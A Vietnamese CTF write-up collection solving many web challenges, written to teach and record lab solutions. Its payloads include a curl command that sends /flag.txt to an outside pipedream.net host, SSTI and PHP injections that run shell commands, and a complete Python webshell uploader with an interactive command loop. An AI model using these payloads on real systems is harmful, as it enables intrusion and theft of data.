3. Ví dụ khi gửi payload `http://www.google.com#@127.0.0.1/flag.php` thì curl sẽ curl 2 site là trang google và trang localhost.
4. Tuy nhiên flag bị filter nên ta sẽ bypass bằng cách gửi payload sau `http://google.com#@127.0.0.1/fla[g-h].php`

## Baby Waiter

1. Ở trang này chúng ta có kết nối api để hiển thị food đã order bằng request
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/a97bf9e9-d66f-4c5a-9a12-709efbb29ab8)
2. Biết rằng ở đây gửi data bằng json nhưng json thì khó có thể khai thác rce mà trong bài có đề cập đến xml nên thử chuyển sang gửi data bằng xml xem có được không và kết quả là có.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/b4683291-1036-42df-a57f-a8642c1a7bc1)
3. Sau đó sử dụng payload XXE: File Disclosure.
![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/c93d9d93-0d4d-44e8-9521-d61dd481f0a0)

## Ping 0x02

1. Từ source code được cấp có thể nhận thấy là input đã bị filter rất nhiều char.
2. Trick lỏ thôi 🕵️
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/50fb613a-74e7-4e09-a006-cc46f369b761)

## Todo Application

1. Đọc source bài này ta nhận thấy một vài điểm như sau
2. Ta có thể truyền file bất kỳ vào param fileTodo và rồi file đó sẽ được open 
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/dc2548bc-6438-4155-96db-c55d7d24c111)
3. Tiếp đó ta có thể chèn mã php vào file phía trên dựa vào tham số add.
4. Như vậy kịch bản sẽ là chèn mã thực thi vào 1 file php bất kỳ (ở đây chọn index.php cho nó hiển thị luôn).
5. Thử một vài payload...
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/c1930601-c674-4928-b259-698910a8bf44)
6. Cuối cùng đọc file flag.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/ad08816d-6baa-44cd-a22e-1378e52f5735)

## Unzip me now

1. Ở bài này ta sẽ sử dụng một kỹ thuật gọi là zip symlink ngoài ra với những bài upload zip có thể tham khảo (zip slip, và zip symlink và cmdi).
2. Về cơ chế thì chúng ta sẽ tạo một symlink tới một file. Khi đó symlink đó sẽ có được giá trị của file đó rồi khi mà có xóa file chính đi thì file link vẫn sẽ còn và chứa nội dung của nó.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/371e1182-508d-47bf-9d15-9019bf0045c5)
3. Thực hiện exploit:
- B1: Tạo link tới file /flag.txt trên máy local
``ln -s /flag.txt flag``
- B2: Zip file link với option
``zip --symlinks flag.zip flag``
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/a3012b5d-3c7f-4c97-bcc8-f8f21e889a6f)

## The Existed File

1. Nhận thấy bài này là command injection. Từ source code có thể thấy các từ trong blacklist. (Ngoài ra nó còn filter space)
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/2a49e15b-d80e-4d7e-9bcd-299fef5c0553)
2. Trong blacklist có char `$` chưa bị filter. Thử với payload `$(whoami)` thì không được. (maybe blind)
3. Nghĩ đến phương án post data file via curl. Payload: ``$(curl${IFS}-d${IFS}@/flag.txt${IFS}https://eonnlyuk1evzal4.m.pipedream.net`` (Sử dụng ${ISP} để bypass filter space)
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/067a6b27-a61b-4569-943c-2bbff4a37a4e)

## Break The Editor Jail

1. Trang này giả lập vim editor
2. Để thực thi command trong vi ta có thể sử dụng ``:!ls``
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/c6c6664a-a04b-471b-ae61-0d21fdcc7645)
3. Đọc flag với ``:!cat flag.txt``

## Memo Baby CSRF

[Miss commit :(](https://r2nw.github.io/posts/MemoBabyCSRF/)

## PHP có làm em lo lắng

1. Bài này bị lừa là csv injection nhưng thực chất là php injection 🐧. Intercept request lúc export rồi chuyển file thành php thay bằng code php để đọc file. Payload: ``<? system('cat /*')?>``

## Under Construction

1. Ở bài này endpoint bằng param ``file=working.png``.
2. Với source code, ta deploy thì nhận thấy có thể lfi nó.
3. Nhưng vì triển khai chưa hoàn thiện nên không thể mở vào file txt mà nó sẽ đọc là file ảnh.
4. Tải file về dưới dạng txt bằng wget.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/55e98fea-90c0-47c9-8f68-9a75fc2963ca)

## The JWT Algorithm

[Ref](https://forum.cookiearena.org/t/writeup-cookiearena-the-jwt-algorithm/154)

## Baby Assert

1. Có 3 trang. Từ trang flag ta có thể biết file flag bị obfu nên rất có thể sẽ phải rce mới đọc được.
2. Ở trang home có đoạn code xử lý file include
```
$file = "pages/" . $page . ".php";
assert(...$file...) or die("Detected hacking attempt!");
require_once $file;
```
3. Có thể thấy ở đây tác giả dùng hàm assert để xác định xem file có tồn tại không nếu không thì hàm assert sẽ ném ra ngoại lệ `die()` kia.
4. [Ref](https://r2nw.github.io/posts/BabyAssert/)
5. Và rất có thể source code sẽ có dạng ``assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");``
6. Khi đó chèn vào param file ``' and die(system("whoami")) or '`` injection thành công.

## Code get Flag

1. Ở bài này có thể thấy ta có thể upload file code python. Và với source code được cấp nó sẽ không cho phép các ký tự non-ascii, không quá 1000 ký tự, .. cùng với đó là một số từ trong blacklist để tránh rce.
2. Ở đây không cần phải inject template vào mà truyền thẳng code python vào. 
3. Ta sẽ từ các class cha, class con để tìm ra class có thể gọi đến module os.
4. Cố gắng reach đến class cha nhất.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/e318a091-87d5-4fbf-a552-e9139778bbce)
5. Liệt kê tất cả các subclass trong class object.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/211515b3-5412-4975-8063-d137cd67ea0c)
6. Tìm class để import có class ``_frozen_importlib.BuiltinImporter`` trông khá tiềm năng.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/d72d0250-59ce-40a1-a837-880cfb16d5bd)
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/133e9d95-2b1d-4302-bc11-33cc30fa569e)
7. Trong class đó có hàm load_module có thể import module os
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/9281308f-f435-4fec-a246-312b23a0539f)
8. Để gọi thuộc tính system (fucntion) trong module sử dụng `__dict__` để bypass blacklist.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/71a6dde5-291b-4399-8ed1-ea6040c9e1d6)

## SVATTT 2016 Quals Curl

1. Có thể đoán được đây là command injection.
2. Phân tích source code:
```
if (!empty($_POST['url']) && is_string($_POST['url'])){
            if(!filter_var($_POST['url'], FILTER_VALIDATE_URL) === false  && substr($_POST['url'],0,7) === "http://"){
$url = strtolower(escapeshellarg($_POST['url']));
if( !preg_match('/(\.localhost|%|flag)/is',$url,$matches) && !preg_match("/(Connected.*\(127\..*?\))/is",$ret,$matches)) {
```
3. Web sẽ check url có hợp lệ, có phải string không, có bắt đầu bằng http:// không, escape shell, không chứa các từ như localhost, flag, %
4. Ở file flag.php nó sẽ hiển thị flag nếu request được gửi từ một ip local. Ngoài ra còn biết được web service được chạy trên cổng 1337
5. Sử dụng ssrf để curl endpoint flag. payload: ``http://127.0.0.1:1337/flag.php``
6. Tuy nhiên như vậy sẽ bị filter. Bypass bằng cách dùng ``http://127.0.0.1:1337/fla[g-h].php`` để nó curl 2 endpoint và có được response chứa flag.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/60008995-013c-4b33-b837-a5c90e4e2dbc)

## Spookifier

1. Dùng acunetix xác định được lỗi của site này là ssti. Giờ tiến hành detect xem nó dùng template gì.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/a4c61392-4fb7-487c-b9c4-57ef94f6c0b1)
2. Từ ảnh trên ta có thể xác định template được sử dụng là mako. Tìm các payload liên quan đến mako.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/bb8cfb0e-e135-4f3d-a056-feb6f92c31ad)
3. Sau đó tìm được payload rce ``${self.module.cache.util.os.system("id")}`` nhưng mà nó chỉ trả về 0.
4. Sau một thời gian tìm hiểu thì biết được dành khi dùng command trên thì nó sẽ cho ra 2 dòng output với dòng thứ 2 chứa mã thoát (exit code) của lệnh. Mã thoát là một giá trị số nguyên thường là 0 hoặc một giá trị khác (khác 0) tùy thuộc vào việc lệnh thực thi thành công hay không. Mã thoát 0 thường cho biết rằng lệnh đã thực thi thành công mà không gặp lỗi.
5. Lúc đầu cứ nghĩ theo hướng OOB (out of band) post file qua curl nhưng không biết tại sao không được.
6. Sau đó mới biết dùng hàm popen để mở file flag rồi thêm hàm read để đọc file ``${self.module.cache.util.os.popen("cat /flag.txt").read()}``
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/61823e1d-83ab-492f-9cfb-99fdfa3906c3)

## Request Bin 

1. Dùng acunetix xác định được lỗi của site này là ssti. Giờ tiến hành detect xem nó dùng template gì.
2. Với payload được dùng để detect trên acunetix cho vào chatgpt nó cho ta biết đây là go template.
3. Search được payload read file ``{{ .Ctx.ServeFile "/flag.txt" }}`` tại [Link](https://github.com/wectf/2022#request-bin)

## Baby Pielily

1. Sau khi thử một vài extension có thể nhận thấy nó sẽ sử dụng biện pháp blacklist để prevent site. Khi dùng mấy ext như ``cuong``,... thì không bị chặn.
2. Ý tưởng của bài là up file ``.htaccess`` với nội dung là ``AddType application/x-httpd-php .cuong`` có ý nghĩa là cho phép file .cuong thực thi php.
3. Up file payload.cuong để đọc flag.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/e45c04bf-a5bd-4c80-afa8-2532565ceb11)

## Crawling

1. Bài này ta biết được là ở endpoint admin port 1337 trong nội bộ có chứa flag -> SSRF
2. Nhập thẳng vào sẽ không được. Trang sẽ crawl host bất kỳ. Vậy nên ta sẽ cho nó request đến host mà ta control. Rồi sau đó cho nó redirect đến endpoint flag.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/c22df96d-7d9a-4d21-9fa2-e6648debfc9c)
3. Gửi reuqest tới file đã tạo.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/866072cb-785f-417a-9bfd-7f4eb779a754)

## Evaluation Deck

1. Bài này có cho source, thấy ở chỗ hàm exec khả nghi có thể rce
2. Nhận thấy trong 3 tham số thì 2 tham số đầu và cuối sẽ được convert về int
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/30b44f7a-d220-4ebd-b108-721578361b82)
3. Lấy đoạn code về để thử các payload khác nhau xem có inject được mã vào hay không
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/c2668915-d6de-44b8-911e-5cfd8b574acd)
4. Craft payload như sau để lấy được flag.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/5c05d944-8c78-4413-811b-339bfba06b87)

## Insufficient blacklisting file types

1. Bài này có vẻ như là file upload vuln with blacklist.
2. Phần script xử lý file upload nhận thấy nó sẽ check xem file type có phải là image không. Không thì sẽ hiện alert
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/757d554f-c456-4823-a9be-ed09bf4a485d)
3. Để bypass nó ta sẽ chặn và sửa request rồi thay bằng file .htaccess cho phép file `.cuong` thực thi mã php nhưng vẫn phải giữ nguyên file type.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/6bf9d6e5-e372-41c9-8285-5f3cc859f737)
4. Upload tiếp file `exploit.cuong` thực thi đoạn code đọc flag.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/5a02bc95-a36f-483e-b1d7-84cbff306009)
5. Vào file exploit.cuong trong dir upload để lấy flag.

## Magic Login Harder

1. Bài này ta được cung cấp source code. Nhận thấy đoạn code xử lý đăng nhập.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/38ad4d9c-dcc9-43c8-af0c-96f6c30ad7f8)
2. Ở đây username và password sau được gửi đi sẽ bị b64 decode. Sau đó check nếu giá trị hash md5 của 2 tham số strict equal (===) thì có session -> Đăng nhập thành công.
3. https://www.mscs.dal.ca/~selinger/md5collision/
4. Bài này khả năng bị lỗi rồi...

## Obfuscating file extensions

1. Ở bài này upload trực tiếp file khác file ảnh sẽ không thành công. Mà ta sẽ phải upload bằng burp suite.
2. Khi gửi một payload dưới file name là `avatar.php` nhận thấy trong response sẽ xóa đi chuỗi `.php` vậy ta sẽ bypass nó bằng cách upload file `avatar.p.phphp`
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/e8878fed-089f-462a-85ca-b14f7cdf53aa)
3. RCE thành công: (Sử dụng system() thay vì exec để output nó chứa nhiều dòng thay vì một dòng)
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/e9f630c4-d938-4a0c-a131-6ac2fb81a7cb)

## Compiler as a Service

1. Với gợi ý từ đề bài, ta biết được site sẽ compile code c,c++.
2. Nhận thấy trong error log trả về lỗi
3. Include "/flag" thì thấy nó đọc file rồi trả về lỗi
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/f89b8c7d-ed47-4a17-8259-03cb7b5f4bc2)
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/b6868deb-50ee-43cb-b599-276db747f8be)

## Empty execution

1. Challenger này cho ta một source code flask python như sau

```
@app.route('/run_command', methods=['POST'])
def run_command():

    # Get command
    data = request.get_json()
    if 'command' in data:
        command = str(data['command'])

        # Length check
        if len(command) < 5:
            return jsonify({'message': 'Command too short'}), 501

        # Perform security checks
        if '..' in command or '/' in command:
            return jsonify({'message': 'Hacking attempt detected'}), 501

        # Find path to executable
        executable_to_run = command.split()[0]

        # Check if we can execute the binary
        if os.access(executable_to_run, os.X_OK):

            # Execute binary if it exists and is executable
            out = os.popen(command).read()
            return jsonify({'message': 'Command output: ' + str(out)}), 200

    return jsonify({'message': 'Not implemented'}), 501
```

2. Dựa trên source code ở trên có thể thấy với post request tới endpoint run_command sử dụng json sẽ đọc 1 key. Rồi kiểm tra độ dài value của key đó phải >= 5, những dấu như `..`, `/` bị filter sau đó cắt chỉ lấy từ đầu tiên (split space). Sau đó giá trị được fill vào hàm os.accesss với đối số thứ 2 là os.X_OK là để check với userid đó có quyền thực thi không.

3.  Thử với dấu . thì nó trả về true.

![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/8bb794e5-4dde-4385-9092-52a47092e365)

4.  Command injection với việc thêm một dấu cách vào sau dấu `.`. Payload: ` "command": ". ;whoami" `

5.  Sử dụng payload sau để bypass filter. `"command": ". ;cat${IFS}${HOME:0:1}flag.txt"`

![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/2ccc258e-a821-4564-9dec-fae9f2c91412)

## Baby Old Preg Voodoobug

1. Chall này có chức năng thay đổi mỗi chuỗi thành 1 chuỗi khác trong một chuỗi gốc.
2. Thử một vài input invalid nhận được mã lỗi sau:

![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/1f559d8d-2567-4581-bcbe-4881dd9dd416)

3. Ta biết được server sử dụng hàm `preg_replace`. Đọc docs để hiểu thêm.
4. Khai thác hàm này với regex `/e` cho phép thực thi eval.

## SQL Truncation Attack

1. trong trang đăng ký có phần source với câu truy vấn tạo user mới được tiết lộ.

![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/3e31991a-5f89-426a-be4d-9e6ea4259370)

2. Ở đây ta thấy username nhận 20 ký tự như vậy ta sẽ sử dụng sqli truncation để tạo một user admin với payload `admin                1` với 15 ký tự space.
3. Đăng nhập với cre ``admin|{password}`` và có được flag.

## Baby Simple Go CURL

1. Đây là một bài ssrf whitebox. Vừa vào trang chủ ta đã thấy có 3 trường: URL. header key, header value. Có thể nhận thấy ứng dụng sẽ chạy lệnh curl để lấy response từ url và có thêm header.
2. Đọc source. Thì trong route /curl/ có đoạn:
```
if c.ClientIP() != "127.0.0.1" && (strings.Contains(reqUrl, "flag") || strings.Contains(reqUrl, "curl") || strings.Contains(reqUrl, "%")) {
			c.JSON(http.StatusBadRequest, gin.H{"message": "Something wrong"})
			return
		}
```
3. Có thể hiểu đoạn xử lý trên là nếu client ip được xác định là khác localhost và những điều kiện filter phía sau trùng thì sẽ wrong.
4. Tức là chỉ cần ClientIP = 127.0.0.1 thì pass.
5. Từ đó gửi request với trường header `X-Forwarded-For: 127.0.0.1` luôn.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/2abb2670-33ac-4d55-9ef8-f41785e1a882)

6. Sử dụng cổng 1337 vì trong docker cấu hình cổng kết nối với container là 1337.

## The Evil Assignment on Canvas

1. (Xem WU) Bài này là file upload mà chỉ cho phép upload file jpg. Với gợi ý magic header byte ta sẽ có hướng như sau: Chèn signature của jpg vào file. Với source code như sau:
```
$magic_num_handler = file_get_contents($_FILES['uploadedfile']['tmp_name']);
  if(bin2hex(substr($magic_num_handler, 0, 3)) != "ffd8ff")
  {
		      if(isset($_FILES['uploadedfile'])){
     echo "<p>Sorry, your submission is not recognized as a JPEG file by the back-end!</p>";
    }                 
      exit;
  }
```

2. Kiếm tra 3 byte đầu xem có phải sign của jpg không. Tiếp đến nó sẽ kiểm tra file name xem có chứa jpg, jpeg không (?) đơn giản bypass bằng cách dùng nhiều extentsion.
```
$fileName = pathinfo($_FILES['uploadedfile']['name'])['basename']; 
  if (strpos($fileName, '.jpg') == false && strpos($fileName, '.jpeg') == false)
  {
		      if(isset($_FILES['uploadedfile'])){
     echo "<p>Sorry, your submission is not recognized as a JPEG file by the back-end!</p>";
    }                 
      exit;
  }
```
3. Khi đó, ta sẽ viết một đoạn code exploit như sau:
```
import requests
import re
from urllib.parse import quote

url = "http://103.97.125.56:30301/"

burp0_headers = {
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryijBAyAxAcQzDE3Xx"
}
burp0_data = """------WebKitFormBoundaryijBAyAxAcQzDE3Xx\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundaryijBAyAxAcQzDE3Xx\r\nContent-Disposition: form-data; name="uploadedfile"; filename="b.jpg.php"\r\nContent-Type: image/jpeg\r\n\r\n\xff\xd8\xff\xe0\x00\x10JFIF<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>\r\n------WebKitFormBoundaryijBAyAxAcQzDE3Xx--\r\n"""
r = requests.post(url + "/index.php", headers=burp0_headers, data=burp0_data)
result = r.text
if "File is valid" in result:
    print("[+] Upload webshell complete.")
else:
    print("[!] Something went wrong while uploading webshell.")

while True:
    cmd = quote(input("[?] Command you want to run: "))
    webshell = requests.get(url + f"/uploads/b.jpg.php?cmd={cmd}").text
    result = (
        re.search(r"<pre>(.*?)</pre>", webshell, re.DOTALL).group(1).strip()
        if re.search(r"<pre>(.*?)</pre>", webshell, re.DOTALL)
        else None
    )
    print(result)
```

4. Kết quả:
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/55d3920c-666d-4dcf-8beb-404d8af970aa)

## Baby Sqlite with filter

1. Trang này security bằng cách filter những ký tự chữ có khả năng bị chèn sql
```
'[', ']', ',', 'admin', 'select', ''', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' '.
                                                             backspace  tab     Null   TAB      CR
```

2. Union select có vẻ ok nhưng từ select đã bị filter. Sử dụng UNION VALUES() ở đây có tác dụng là tạo một bảng ảo với giá trị cột là giá trị truyền vào

![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/effb2008-9328-4a5e-8047-530c067655c5)

3. Tuy nhiên từ admin cũng đã bị filter -> dùng char() để ép kiểu về ascii.
4. Cuối cùng với việc filter whitespace -> sử dụng /**/

`uid=&upw=&level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))`

5. Kết quả đạt được là flag.
![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/a4f54cab-dfa2-4016-b038-b4f78d7e9651)
